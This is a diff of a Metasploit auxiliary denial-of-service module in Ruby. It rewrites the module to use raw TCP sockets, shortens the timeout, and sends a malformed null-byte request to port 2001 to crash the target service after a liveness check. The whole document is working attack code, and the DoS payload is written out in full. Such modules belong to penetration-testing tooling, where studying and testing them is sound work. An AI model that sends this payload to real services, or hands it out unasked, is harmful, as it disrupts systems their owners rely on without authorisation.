@@ -9,7 +9,7 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::HttpClient
+	include Msf::Exploit::Remote::Tcp
 	include Msf::Auxiliary::Dos
 
 	def initialize(info = {})
@@ -34,17 +34,14 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				Opt::RPORT(2001),
-				OptInt.new("TIMEOUT", [ false, "Set timeout for connectivity check", 30 ]),
+				OptInt.new("TIMEOUT", [ false, "Set timeout for connectivity check", 10 ]),
 			], self.class)
 	end
 
 	def is_alive
 		connect
-		res = send_request_raw({
-			'method' => "GET",
-			'uri' => "/"
-		}, timeout = datastore['TIMEOUT'])
-		if ! res
+		sock.put("GET / HTTP/1.1\r\nHost:foo\r\n\r\n")
+		if ! sock.get_once(-1, datastore['TIMEOUT'])
 			raise ::Rex::ConnectionTimeout
 		end
 		disconnect
@@ -56,7 +53,7 @@ class Metasploit3 < Msf::Auxiliary
 				is_alive
 				connect
 				print_status("Sending DoS packet to #{rhost}:#{rport}")
-				send_request_raw({'method' => "\x00"})
+				sock.put("\x00 / \r\n\r\n")
 				disconnect
 			rescue ::Rex::ConnectionRefused
 				print_status("Unable to connect to #{rhost}:#{rport}.")
